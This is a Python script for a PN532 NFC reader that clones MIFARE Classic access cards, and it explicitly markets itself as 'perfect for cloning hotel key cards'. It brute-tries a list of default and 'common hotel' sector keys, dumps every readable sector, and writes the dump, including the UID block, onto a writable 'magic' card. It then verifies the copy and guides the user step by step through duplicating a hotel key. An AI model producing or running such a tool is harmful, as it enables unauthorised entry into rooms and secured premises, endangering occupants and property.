#!/usr/bin/env python3
"""
NFC Card Cloner
Reads full card dumps and writes to magic cards
Perfect for hotel key cards!
"""

import board
import busio
from adafruit_pn532.i2c import PN532_I2C
import time

class NFCCloner:
    def __init__(self):
        """Initialize PN532"""
        i2c = busio.I2C(board.SCL, board.SDA)
        self.pn532 = PN532_I2C(i2c, debug=False)
        self.pn532.SAM_configuration()

        # Common MIFARE keys to try
        self.default_keys = [
            [0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF],  # Factory default
            [0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5],  # Transport key
            [0xD3, 0xF7, 0xD3, 0xF7, 0xD3, 0xF7],  # MAD key
            [0x00, 0x00, 0x00, 0x00, 0x00, 0x00],  # All zeros
            [0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5],  # Common hotel key
            [0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF],  # Common hotel key 2
        ]

    def read_full_card(self):
        """
        Read all accessible sectors from a MIFARE Classic card
        Returns dict with UID and sector data
        """
        print("[*] Reading card...")

        uid = self.pn532.read_passive_target(timeout=1.0)
        if uid is None:
            return {'error': 'No card found'}

        uid_hex = ''.join([f'{i:02X}' for i in uid])
        print(f"[+] Card UID: {':'.join(uid_hex[i:i+2] for i in range(0, len(uid_hex), 2))}")

        # MIFARE Classic 1K has 16 sectors (64 blocks)
        # MIFARE Classic 4K has 40 sectors (256 blocks)
        total_sectors = 16 if len(uid) == 4 else 40

        card_dump = {
            'uid': uid_hex,
            'uid_bytes': list(uid),
            'sectors': {},
            'keys': {},
            'read_errors': []
        }

        print(f"[*] Reading {total_sectors} sectors...")
        print()

        for sector in range(total_sectors):
            # Each sector has 4 blocks (except sector 0 which has block 0)
            first_block = sector * 4

            # Try to authenticate with different keys
            authenticated = False
            key_used = None

            for key in self.default_keys:
                try:
                    # Try Key A
                    auth = self.pn532.mifare_classic_authenticate_block(
                        uid, first_block, 0x60, key
                    )
                    if auth:
                        authenticated = True
                        key_used = ('A', key)
                        break
                except:
                    pass

                try:
                    # Try Key B
                    auth = self.pn532.mifare_classic_authenticate_block(
                        uid, first_block, 0x61, key
                    )
                    if auth:
                        authenticated = True
                        key_used = ('B', key)
                        break
                except:
                    pass

            if not authenticated:
                print(f"  [!] Sector {sector:02d}: Authentication failed")
                card_dump['read_errors'].append(sector)
                continue

            # Read all 4 blocks in the sector
            sector_data = []
            for block_offset in range(4):
                block_num = first_block + block_offset
                try:
                    block_data = self.pn532.mifare_classic_read_block(block_num)
                    if block_data:
                        sector_data.append(list(block_data))
                    else:
                        sector_data.append([0] * 16)
                except Exception as e:
                    print(f"  [!] Block {block_num}: Read error")
                    sector_data.append([0] * 16)

            card_dump['sectors'][sector] = sector_data
            card_dump['keys'][sector] = {
                'type': key_used[0],
                'key': list(key_used[1])
            }

            # Progress indicator
            blocks_read = len(sector_data)
            print(f"  [✓] Sector {sector:02d}: Read {blocks_read} blocks (Key {key_used[0]})")

        print()
        success_rate = (total_sectors - len(card_dump['read_errors'])) / total_sectors * 100
        print(f"[+] Dump complete! {success_rate:.1f}% success")
        print(f"[+] Total sectors: {len(card_dump['sectors'])}/{total_sectors}")

        return card_dump

    def write_to_magic_card(self, card_dump):
        """
        Write a card dump to a magic card
        WARNING: This will overwrite the magic card completely!
        """
        print("[*] Writing to magic card...")
        print("[!] WARNING: This will OVERWRITE the card!")
        print()

        uid = self.pn532.read_passive_target(timeout=1.0)
        if uid is None:
            return {'error': 'No card found'}

        current_uid = ''.join([f'{i:02X}' for i in uid])
        target_uid = card_dump['uid']

        print(f"[*] Current card UID: {':'.join(current_uid[i:i+2] for i in range(0, len(current_uid), 2))}")
        print(f"[*] Target UID:       {':'.join(target_uid[i:i+2] for i in range(0, len(target_uid), 2))}")
        print()

        # Write all sectors
        total_sectors = len(card_dump['sectors'])
        write_errors = []

        for sector, blocks in card_dump['sectors'].items():
            first_block = sector * 4

            # Authenticate with the key we found
            key_info = card_dump['keys'].get(sector)
            if not key_info:
                # Try default key
                key = self.default_keys[0]
                key_type = 0x60
            else:
                key = key_info['key']
                key_type = 0x60 if key_info['type'] == 'A' else 0x61

            try:
                auth = self.pn532.mifare_classic_authenticate_block(
                    uid, first_block, key_type, key
                )
                if not auth:
                    print(f"  [!] Sector {sector:02d}: Auth failed")
                    write_errors.append(sector)
                    continue
            except:
                print(f"  [!] Sector {sector:02d}: Auth error")
                write_errors.append(sector)
                continue

            # Write blocks (skip sector trailer - block 3)
            for block_offset in range(3):  # Only write blocks 0, 1, 2
                block_num = first_block + block_offset
                block_data = blocks[block_offset]

                # Special handling for block 0 (UID block)
                if block_num == 0:
                    # On magic cards, we can write block 0 to change UID
                    print(f"  [*] Block 0: Writing UID block (magic card)")

                try:
                    # Convert to bytes if needed
                    if isinstance(block_data, list):
                        block_bytes = bytes(block_data)
                    else:
                        block_bytes = block_data

                    success = self.pn532.mifare_classic_write_block(block_num, block_bytes)
                    if success:
                        print(f"  [✓] Block {block_num:02d}: Written")
                    else:
                        print(f"  [!] Block {block_num:02d}: Write failed")
                except Exception as e:
                    print(f"  [!] Block {block_num:02d}: Error - {e}")

        print()
        success_rate = (total_sectors - len(write_errors)) / total_sectors * 100
        print(f"[+] Write complete! {success_rate:.1f}% success")

        return {
            'success': True,
            'sectors_written': total_sectors - len(write_errors),
            'total_sectors': total_sectors,
            'errors': write_errors
        }

    def verify_clone(self, original_dump):
        """
        Verify that a cloned card matches the original
        """
        print("[*] Verifying clone...")

        cloned_dump = self.read_full_card()

        if 'error' in cloned_dump:
            return {'error': cloned_dump['error']}

        # Compare UIDs
        uid_match = cloned_dump['uid'] == original_dump['uid']

        # Compare sector data
        sectors_match = 0
        sectors_total = 0

        for sector in original_dump['sectors']:
            if sector in cloned_dump['sectors']:
                sectors_total += 1
                if cloned_dump['sectors'][sector] == original_dump['sectors'][sector]:
                    sectors_match += 1

        print()
        print(f"[*] UID Match: {'✓ YES' if uid_match else '✗ NO'}")
        print(f"[*] Sectors Match: {sectors_match}/{sectors_total}")

        success = uid_match and (sectors_match == sectors_total)

        if success:
            print("[+] ✓ Clone verified successfully!")
        else:
            print("[!] ✗ Clone verification failed")

        return {
            'verified': success,
            'uid_match': uid_match,
            'sectors_match': sectors_match,
            'sectors_total': sectors_total
        }

# Test if run directly
if __name__ == '__main__':
    print("=" * 70)
    print("  🎩 NFC CARD CLONER")
    print("=" * 70)
    print()
    print("Perfect for cloning hotel key cards!")
    print()
    print("Step 1: Read source card (hotel key)")
    print("Step 2: Write to magic card")
    print("Step 3: Verify clone")
    print()

    try:
        cloner = NFCCloner()

        input("Place SOURCE card (hotel key) on reader and press Enter...")
        print()

        # Read source card
        source_dump = cloner.read_full_card()

        if 'error' in source_dump:
            print(f"[!] Error: {source_dump['error']}")
            exit(1)

        print()
        input("Remove source card. Place MAGIC card on reader and press Enter...")
        print()

        # Write to magic card
        result = cloner.write_to_magic_card(source_dump)

        if 'error' in result:
            print(f"[!] Error: {result['error']}")
            exit(1)

        print()
        input("Keep magic card on reader and press Enter to verify...")
        print()

        # Verify
        verification = cloner.verify_clone(source_dump)

        print()
        print("=" * 70)
        if verification.get('verified'):
            print("🎉 SUCCESS! Your magic card is now a clone of the hotel key!")
            print("=" * 70)
        else:
            print("⚠️  Clone may not be perfect. Try using the card to test.")
            print("=" * 70)

    except KeyboardInterrupt:
        print("\n[!] Cancelled by user")
    except Exception as e:
        print(f"\n[!] Error: {e}")
        import traceback
        traceback.print_exc()
